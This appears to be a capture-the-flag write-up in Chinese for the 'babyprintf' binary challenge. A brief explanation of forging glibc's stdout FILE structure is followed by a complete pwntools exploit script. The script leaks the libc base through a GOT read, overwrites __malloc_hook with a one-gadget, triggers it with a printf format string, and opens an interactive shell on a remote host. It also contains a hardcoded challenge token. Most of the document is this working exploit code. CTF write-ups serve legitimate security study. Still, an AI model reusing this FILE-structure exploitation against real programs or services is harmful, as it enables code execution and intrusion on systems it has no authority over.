# babyprintf

可以覆盖stdout，因为可以伪造一个IO_stdout来做事：
    * 可以伪造stdout的flags，使其从_IO_write_base的地址开始泄露，从而泄露libc
    * 可以伪造stdout的_IO_write_ptr，其他指针清零，可以往_IO_write_ptr内存的地方写

> 第一次知道stdout还可以解发写操作

最后，通过printf来触发malloc(),从而触发malloc_hook。

伪造IO的函数，可以复用。


```python
#!/usr/bin/env python2
# coding: utf-8
# Usage: ./exploit.py -r/-l/-d

from pwn import *
import argparse
import itertools
import time
import os

# IP = "52.68.236.186"
# PORT = 56746
IP = "150.109.46.159"
PORT = 20005

one_gg = 0x4f322

context.arch = "amd64"
context.log_level = 'DEBUG'
context.log_level = 'critical'
context.terminal = ['tmux', 'splitw', '-h', '-p', '70']
BIN = "./babyprintf_ver2"

def lg(s, addr):
    print('\033[1;31;40m%30s-->0x%x\033[0m' % (s, addr))

def r(x): return io.recv(x)
def ru(x): return io.recvuntil(x)
def rud(x): return io.recvuntil(x, drop=True)
def se(x): return io.send(x)
def sel(x): return io.sendline(x)
def pick32(x): return u32(x[:4].ljust(4, '\0'))
def pick64(x): return u64(x[:8].ljust(8, '\0'))


parser = argparse.ArgumentParser()

parser.add_argument('-d', '--debugger', action='store_true')
parser.add_argument('-r', '--remote', action='store_true')
parser.add_argument('-l', '--local', action='store_true')
args = parser.parse_args()


io = None  # this is global process variable

binary = ELF(BIN)

if args.remote:
    io = remote(IP, PORT)  
    rud("Input your token:")
    sel("7024ZEBXOyaCi7hWLskq2GKI1NUczUay")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
elif args.local:
    # env = {"LD_PRELOAD": os.path.join(os.getcwd(), "libc.so.6")}
    env = {}
    io = process(BIN,  env=env)
    proc_base = io.libs()[os.path.abspath(os.path.join(os.getcwd(), BIN))]
    libc_bb = io.libs()[
        '/lib/x86_64-linux-gnu/libc.so.6']
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
elif args.debugger:
    io = gdb.debug(BIN, '''
    entry-break
    b *0x{:x}
    b *0x{:x}
    b *0x{:x}
    c
    b *0x{:x}
    p/x &__free_hook
    p/x &_IO_2_1_stdout_
    p/x 0x00007ffff79e4000 + 0x{:x}
    '''.format(
        0x555555554000 + 0x0000000000000740,  # stdout
        0x555555554000 + 0x0000000000000921,  # printf
        0x555555554000 + 0x00000000000007AE, # stdout compare
        0x00007ffff79e4000 + one_gg,
        one_gg,
        )
    )
    proc_base = io.libs()[os.path.abspath(os.path.join(os.getcwd(), BIN))]
    libc_bb = io.libs()[
        '/lib/x86_64-linux-gnu/libc.so.6']
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    parser.print_help()
    exit()


def pack_file(_flags=0,
              _IO_read_ptr=0,
              _IO_read_end=0,
              _IO_read_base=0,
              _IO_write_base=0,
              _IO_write_ptr=0,
              _IO_write_end=0,
              _IO_buf_base=0,
              _IO_buf_end=0,
              _IO_save_base=0,
              _IO_backup_base=0,
              _IO_save_end=0,
              _IO_marker=0,
              _IO_chain=0,
              _fileno=0,
              _lock=0,
              _wide_data=0,
              _mode=0):
    file_struct = p32(_flags) + \
            p32(0) + \
            p64(_IO_read_ptr) + \
            p64(_IO_read_end) + \
            p64(_IO_read_base) + \
            p64(_IO_write_base) + \
            p64(_IO_write_ptr) + \
            p64(_IO_write_end) + \
            p64(_IO_buf_base) + \
            p64(_IO_buf_end) + \
            p64(_IO_save_base) + \
            p64(_IO_backup_base) + \
            p64(_IO_save_end) + \
            p64(_IO_marker) + \
            p64(_IO_chain) + \
            p32(_fileno) +\
            p32(0) +\
            p64(0xffffffffffffffff)
            # p64(0x000000000a000000) 
    file_struct = file_struct.ljust(0x88, "\x00")
    file_struct += p64(_lock)
    file_struct += p64(0xffffffffffffffff)
    file_struct = file_struct.ljust(0xa0, "\x00")
    file_struct += p64(_wide_data)
    file_struct = file_struct.ljust(0xc0, '\x00')
    file_struct += p64(_mode)
    file_struct = file_struct.ljust(0xd8, "\x00")
    return file_struct



rud(" buffer location to")
printf_bss = int(rud("\n").strip(), 16)
lg("printf bss addr:", printf_bss)
binary.address = printf_bss - 0x0000000000202010
lg("binary base address:", binary.address)


rud("Have fun!")
# new_stdout = 0x0000000000202010 + binary.address - 0xd8
new_stdout = 0x0000000000202010 + binary.address + 0x20
pad = "A"*16 + p64(new_stdout) + "B"*8

file_struct = pack_file(_flags=0x00000000fbad1800,
                        _IO_read_ptr=0,
                        _IO_read_base=0,
                        # _IO_write_base=new_stdout + 0xe3 - 0x60,
                        _IO_write_base=binary.got["puts"],
                        _IO_write_ptr=new_stdout + 0xe3 - 0x60,
                        _IO_write_end=new_stdout + 0xe3 - 0x60,
                        _IO_buf_base=new_stdout + 0xe3 - 0x60,
                        _IO_buf_end=new_stdout + 0xe3 - 0x60 + 1,
                        _mode=0x00000000ffffffff,
                        _fileno=1,
                        _lock=new_stdout+0x200,
                        _wide_data=new_stdout+0x300
                        )
pad += file_struct

sel(pad)
rud("rewrite vtable is not permitted!\n")
data = io.recv(8)
puts_addr = pick64(data)
libc.address = puts_addr - libc.symbols["puts"]
lg("libc address", libc.address)

pad = "C"*16 + p64(new_stdout) + "D"*8
pad = p64(new_stdout + 0x120 + 7*8)*2 + p64(new_stdout) + "D"*8
pad = p64(one_gg + libc.address)*2 + p64(new_stdout) + "D"*8
file_struct = pack_file(_flags=0x00000000fbad1800,
                        _IO_read_ptr=0,
                        _IO_read_base=0,
                        # _IO_write_base=new_stdout + 0xe3 - 0x60,
                        _IO_write_base=libc.symbols["__malloc_hook"] - 0x10,
                        _IO_write_ptr=libc.symbols["__malloc_hook"],
                        _IO_write_end=libc.symbols["__malloc_hook"] + 0x20,
                        _IO_buf_base=0,
                        _IO_buf_end=0,
                        _mode=0x00000000ffffffff,
                        _fileno=1,
                        _lock=new_stdout+0x200,
                        _wide_data=new_stdout+0x300
                        )
pad += file_struct


io.sendline(pad[:-1])
io.sendline("%1000000c")


io.interactive()
```
